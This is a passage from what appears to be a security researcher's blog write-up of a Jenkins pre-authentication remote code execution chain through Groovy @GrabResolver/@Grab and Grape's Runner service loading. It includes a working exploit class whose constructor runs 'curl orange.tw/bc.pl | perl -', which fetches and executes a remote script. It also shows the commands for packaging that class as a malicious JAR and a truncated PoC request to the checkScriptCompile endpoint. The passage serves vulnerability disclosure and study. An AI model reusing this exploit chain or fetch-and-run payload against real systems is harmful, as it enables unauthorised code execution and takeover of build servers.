&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; intel &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; template
...
00000000000005fa &amp;lt;main&amp;gt;:
 5fa:   55                      push   rbp
 5fb:   48 89 e5                mov    rbp,rsp
 5fe:   c7 45 f4 37 00 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xc],0x37
 605:   c7 45 f8 6d 1a 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],0x1a6d
 60c:   c7 45 &lt;span class=&quot;nb&quot;&gt;fc &lt;/span&gt;cb 7e 19 06    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x4],0x6197ecb
 613:   b8 00 00 00 00          mov    eax,0x0
 618:   5d                      pop    rbp
 619:   c3                      ret
 61a:   66 0f 1f 44 00 00       nop    WORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax+rax&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1+0x0]
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For more examples, you can refer to the article &lt;a href=&quot;https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb&quot;&gt;Build a Compiler Bomb&lt;/a&gt; on StackOverflow!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;first-attempt&quot;&gt;First Attempt&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;Back to our exploitation, Pipeline is just a DSL built with Groovy, and Groovy is also a Meta-Programming friendly language. We start reading the Groovy official &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Meta-Programming manual&lt;/a&gt; to find some exploitation ways. In the section 2.1.9, we found the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@groovy.transform.ASTTest&lt;/code&gt; annotation. Here is its description:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer “explore” the AST during compilation and &lt;strong&gt;perform assertions on the AST&lt;/strong&gt; rather than on the result of compilation. This means that this AST transformations gives access to the AST before the Bytecode is produced. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; can be placed on any annotable node and requires two parameters:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;What! &lt;strong&gt;perform assertions on the AST&lt;/strong&gt;? Isn’t that what we want? Let’s write a simple Proof-of-Concept in local environment first:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec(&quot;touch pwned&quot;)
})
def x
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;groovy poc.groovy
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy  pwned
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool, it works! However, while reproducing this on the remote Jenkins, it shows:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;unable to resolve class org.jenkinsci.plugins.workflow.libs.Library&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190219/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What the hell!!! What’s wrong with that?&lt;/p&gt;

&lt;p&gt;With a little bit digging, we found the root cause. This is caused by the &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt;! In order to reuse functions in Pipeline, Jenkins provides the feature that can import customized library into Pipeline! Jenkins will load this library before every executed Pipeline. As a result, the problem become lack of corresponding library in classPath during compile-time. That’s why the error &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unsable to resolve class&lt;/code&gt; occurs!&lt;/p&gt;

&lt;p&gt;How to fix this problem? It’s simple! Just go to &lt;a href=&quot;http://jenkins.local/pluginManager/&quot;&gt;Jenkins Plugin Manager&lt;/a&gt; and remove the &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt;! It can fix the problem and then we can execute arbitrary code without any error! But, this is not a good solution because this plugin is installed along with the Pipeline. It’s lame to ask administrator to remove the plugin for code execution! We stop digging this and try to find another way!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;second-attempt&quot;&gt;Second Attempt&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;We continued reading the &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Groovy Meta-Programming manual&lt;/a&gt; and found another interesting annotation - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;. There is no detailed information about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; on the manual. However, we found another article - &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/documentation/grape.html&quot;&gt;Dependency management with Grape&lt;/a&gt; on search engine!&lt;/p&gt;

&lt;p&gt;Oh, from the article we know Grape is a built-in JAR dependency management in Groovy! It can help programmers import the library which are not in classPath. The usage looks like:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.springframework&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;spring-orm&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;3.2.5.RELEASE&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.jdbc.core.JdbcTemplate&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; annotation, it can import the JAR file which is not in classPath during compile-time automatically! If you just want to bypass the Pipeline sandbox via a valid credential and the permission of Pipeline execution, that’s enough. You can follow the &lt;a href=&quot;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&quot;&gt;PoC&lt;/a&gt; proveded by &lt;a href=&quot;https://github.com/adamyordan&quot;&gt;@adamyordan&lt;/a&gt; to execute arbitrary commands!&lt;/p&gt;

&lt;p&gt;However, without a valid credential and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, this is just an AST parser and you even can’t control files on remote server. So, what can we do? By diving into more about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;, we found another interesting annotation - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@GrabResolver&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@GrabResolver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://maven.restlet.org/&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;1.1.6&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.restlet&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you are smart enough, you would like to change the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; parameter to a malicious website! Let’s try this in local environment:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
@GrabResolver(name=&apos;restlet&apos;, root=&apos;http://orange.tw/&apos;)
@Grab(group=&apos;org.restlet&apos;, module=&apos;org.restlet&apos;, version=&apos;1.1.6&apos;)
import org.restlet
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;pre&gt;&lt;code class=&quot;language-log&quot;&gt;11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] &quot;HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1&quot; 404 185 &quot;-&quot; &quot;Apache Ivy/2.4.0&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Wow, it works! Now, we believe we can make Jenkins import any malicious library by Grape! However, the next problem is, how to get code execution?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-way-to-code-execution&quot;&gt;The Way to Code Execution&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;In the exploitation, the target is always escalating the read primitive or write primitive to code execution! From the previous section, we can write malicious JAR file into remote Jenkins server by Grape. However, the next problem is how to execute code?&lt;/p&gt;

&lt;p&gt;By diving into &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java&quot;&gt;Grape implementation on Groovy&lt;/a&gt;, we realized the library fetching is done by the class &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy&quot;&gt;groovy.grape.GrapeIvy&lt;/a&gt;! We started to find is there any way we can leverage, and we noticed an interesting method &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(…)&lt;/a&gt;!&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processOtherServices&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processSerializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.plugins.Runners&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ignore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// ignore files we can&apos;t process, e.g. non-jar/zip artifacts&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// TODO log a warning&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;JAR file is just a subset of ZIP format. In the &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(…)&lt;/a&gt;, Grape registers servies if there are some specified entry points. Among them, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Runner&lt;/code&gt; interests me. By looking into the implementation of &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335&quot;&gt;processRunners(…)&lt;/a&gt;, we found this:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLines&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;GroovySystem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;RUNNER_REGISTRY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newInstance()&lt;/code&gt;. Does it mean that we can call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; on any class? Yes, so, we can just create a malicious JAR file, and put the class name into the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;META-INF/services/org.codehaus.groovy.plugins.Runners&lt;/code&gt; and we can invoke the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; and execute arbitrary code!&lt;/p&gt;

&lt;p&gt;Here is the full exploit:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Orange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Orange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;curl orange.tw/bc.pl | perl -&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;javac Orange.java
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; META-INF/services/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Orange &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; META-INF/services/org.codehaus.groovy.plugins.Runners
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
./Orange.java
./Orange.class
./META-INF
./META-INF/services
./META-INF/services/org.codehaus.groovy.plugins.Runners

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;jar cvf poc-1.jar tw/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;poc-1.jar ~/www/tw/orange/poc/1/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://[your_host]/tw/orange/poc/1/poc-1.jar
HTTP/1.1 200 OK
Date: Sat, 02 Feb 2019 11:10:55 GMT
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
?value=
@GrabConfig(disableChecksums=true)%0a
@GrabResolver(name=&apos;orange.tw&apos;, root=&apos;http://[your_host]/&apos;)%0a
